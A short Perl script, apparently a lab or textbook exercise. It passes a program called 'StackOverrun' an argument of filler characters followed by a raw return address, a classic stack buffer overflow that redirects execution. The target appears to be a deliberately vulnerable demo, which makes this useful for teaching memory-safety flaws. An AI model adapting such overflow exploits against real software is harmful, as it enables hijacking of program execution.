$arg = "ZZZZZZZZZZZZZZZZZZZZZZ"."\x7E\x14\x40";
$cmd = "StackOverrun ".$arg;

system($cmd);

